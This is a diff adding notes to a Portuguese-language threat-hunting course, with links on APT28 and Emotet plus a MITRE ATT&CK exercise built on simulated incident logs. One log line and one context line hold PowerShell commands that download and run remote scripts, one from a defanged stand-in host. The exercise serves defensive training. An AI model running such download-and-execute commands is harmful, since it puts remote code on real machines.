@@ -63,3 +63,80 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/
 ### Office 2013
 https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link
 
+## Ubuntu - OpenCTI
+
+### OpenCTI
+
+## Ubuntu - Wazuh
+
+### Wazuh
+
+## 01 Fundamentos de Threat Hunter
+
+### APT28 Fancy Bear
+https://en.wikipedia.org/wiki/Fancy_Bear
+
+### O grupo APT28 ataca agências governamentais ucranianas através do Signal usando malware
+https://csirt.csi.cip.gov.ua/en/posts/apt28-attacks-ukrainian-government-agencies-via-signal-using-malware
+
+### CTIR Gov - Centro de Prevenção, Tratamento e Resposta a Incidentes Cibernéticos de Governo
+https://www.gov.br/ctir/pt-br/assuntos/noticias/2023/ameaca-cibernetica-ativa-emotet-e-trickbot
+
+### app do Google
+https://myaccount.google.com/apppasswords
+
+### Teste Web
+http://testphp.vulnweb.com/login.php
+
+### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK - Logs
+```
+1. Log de e-mail (Phishing inicial)
+Fonte: Mail Gateway
+Timestamp: 2025-10-04T08:15:23Z  
+From: hr@secure-docs[.]org  
+To: finance.director@targetcorp.com  
+Subject: Atualização de política de benefícios 2025  
+Attachment: Benefits_Update_2025.doc  
+Verdict: Suspicious macro detected
+
+2. Log de execução de macro (Office)
+Fonte: Endpoint EDR
+Timestamp: 2025-10-04T08:16:02Z  
+Host: FINANCE-PC01  
+Process: WINWORD.EXE  
+Child Process: powershell.exe  
+Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"  
+Verdict: Malicious PowerShell execution
+
+4. Log de movimentação lateral via SMB
+Fonte: Network Sensor (Zeek)
+Timestamp: 2025-10-04T08:20:12Z  
+Source IP: 10.0.5.21  
+Destination IP: 10.0.5.45  
+Protocol: SMB  
+Action: File transfer – `update.ps1` copied to `\\10.0.5.45\C$\Users\Public\`  
+Verdict: Lateral movement suspected
+
+5. Log de exfiltração via HTTP/S
+Fonte: Proxy Logs
+Timestamp: 2025-10-04T08:25:33Z  
+Host: FINANCE-PC01  
+Destination: secure-data[.]net  
+URL: https://secure-data[.]net/api/upload?session=abc123  
+Payload Size: 4.2 MB  
+Verdict: Unusual outbound data transfer
+
+6. Log de beaconing (C2)
+Fonte: Firewall Logs
+Timestamp: 2025-10-04T08:30:00Z  
+Source IP: 10.0.5.21  
+Destination IP: 182.92.158.231  
+Protocol: TCP  
+Port: 443  
+Frequency: Every 5 minutes  
+Verdict: Persistent outbound connection to known APT10 infrastructure
+```
+
+### MITRE Navigator
+https://mitre-attack.github.io/attack-navigator/
+
